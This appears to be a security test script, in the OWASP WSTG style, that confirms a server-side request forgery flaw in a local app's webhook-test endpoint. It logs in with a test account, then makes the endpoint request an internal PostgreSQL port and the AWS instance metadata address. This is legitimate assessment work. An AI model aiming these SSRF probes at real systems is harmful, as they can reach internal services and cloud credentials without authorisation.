"""
WSTG-INPV-19: Server-Side Request Forgery — Webhook Test
Demonstrates that the /api/webhooks/test endpoint accepts arbitrary URLs,
enabling SSRF attacks against internal services.
Expected: Request to internal host returns error (but confirms SSRF capability)
"""
import requests

BASE = "http://localhost:3000"

# Login to get valid token
login = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testclient@hireflow.com",
    "password": "password123"
})
token = login.json()["token"]

# Step 1: Try to access internal PostgreSQL port
print("Testing SSRF against internal PostgreSQL port...")
resp = requests.post(
    f"{BASE}/api/webhooks/test",
    json={"url": "http://127.0.0.1:5432"},
    headers={"Authorization": f"Bearer {token}"}
)
print(f"Status: {resp.status_code}")
print(f"Response: {resp.json()}")

# Step 2: Try AWS metadata endpoint
print("\nTesting SSRF against AWS metadata endpoint...")
resp = requests.post(
    f"{BASE}/api/webhooks/test",
    json={"url": "http://169.254.169.254/latest/meta-data/"},
    headers={"Authorization": f"Bearer {token}"}
)
print(f"Status: {resp.status_code}")
print(f"Response: {resp.json()}")

print("\n[VULNERABLE] SSRF confirmed - application makes outbound requests to attacker-controlled URLs")
print("This can be used to scan internal network or access internal services")
